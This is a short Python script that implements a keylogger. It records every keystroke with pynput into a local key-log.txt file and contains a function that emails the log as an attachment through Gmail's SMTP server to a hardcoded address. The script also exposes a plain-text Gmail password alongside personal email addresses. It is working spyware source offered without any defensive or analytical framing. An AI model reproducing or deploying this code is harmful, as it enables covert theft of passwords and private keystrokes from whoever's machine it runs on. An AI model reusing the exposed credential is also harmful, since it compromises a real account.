#!/usr/bin/env python
from pynput.keyboard import Key, Listener

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from scipy.io.wavfile import write


def send_email():
    from_addr = "brickandbird@gmail.com"
    to_addr = "dhruvrkulkarni@gmail.com"

    msg = MIMEMultipart()

    msg['From'] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = "Open me Daddy!"

    body = "Hello there, Please open me daddy!"

    msg.attach(MIMEText(body, 'plain'))

    filename = "key-log.txt"
    attachment = open("/Users/dhruvkulkarni/Programming/pythonProjects/key-log.txt", "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(from_addr, "Saidada003.")

    text = msg.as_string()

    s.sendmail(from_addr, to_addr, text)

    s.quit()

# send_email()

count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("./key-log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close
            elif k.find("Key") == -1:
                f.write(k)
                f.close

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()